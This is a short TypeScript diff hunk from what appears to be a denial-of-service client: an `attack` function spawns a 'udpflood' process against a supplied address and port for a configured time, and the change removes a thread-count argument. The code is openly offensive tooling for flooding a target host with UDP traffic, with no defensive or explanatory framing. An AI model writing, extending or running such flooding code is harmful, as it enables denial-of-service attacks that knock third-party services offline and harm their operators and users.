@@ -34,7 +34,7 @@ function sleep(time: number): Promise<void> {
 
 function attack(address: string, port: number): Promise<void> {
 	log.info(`Attack of ${address}:${port} started.`);
-	const attackProcess = spawn("udpflood", ["-t", address, "-p", port.toString(), "-c", os.cpus.length.toString()]);
+	const attackProcess = spawn("udpflood", ["-t", address, "-p", port.toString()]);
 	setTimeout(() => {
 		attackProcess.kill();
 	}, config.attackTimeout);
